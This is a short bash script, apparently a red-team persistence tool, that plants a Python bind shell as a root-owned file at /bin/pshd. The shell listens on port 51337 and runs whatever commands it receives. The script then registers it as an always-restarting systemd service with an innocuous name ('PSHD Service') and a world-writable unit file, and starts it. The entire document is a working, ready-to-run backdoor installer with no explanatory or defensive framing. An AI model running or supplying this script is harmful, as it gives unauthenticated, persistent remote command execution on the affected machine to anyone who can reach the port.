#! /bin/bash

# Python Bind Shell
# Source: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md#python
script="import socket as s,subprocess as sp;

s1 = s.socket(s.AF_INET, s.SOCK_STREAM);
s1.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1);
s1.bind((\"0.0.0.0\", 51337));
s1.listen(1);
c, a = s1.accept();

while True: 
    d = c.recv(1024).decode();
    p = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE);
    c.sendall(p.stdout.read()+p.stderr.read())"

# Place script at /bin/pshd and set permissions
echo "$script" > /bin/pshd
chown root /bin/pshd
chmod 700 /bin/pshd

# Create Systemd Service to execute script
service="[Unit]
Description=PSHD Service
[Service]
ExecStart=/usr/bin/python3 /bin/pshd
Type=simple
Restart=always
[Install]
WantedBy=multi-user.target"

# Create service file
echo "$service" > /etc/systemd/system/pshd.service
chown root /etc/systemd/system/pshd.service
chmod 777 /etc/systemd/system/pshd.service

# Enable service
systemctl enable pshd.service
systemctl start pshd.service
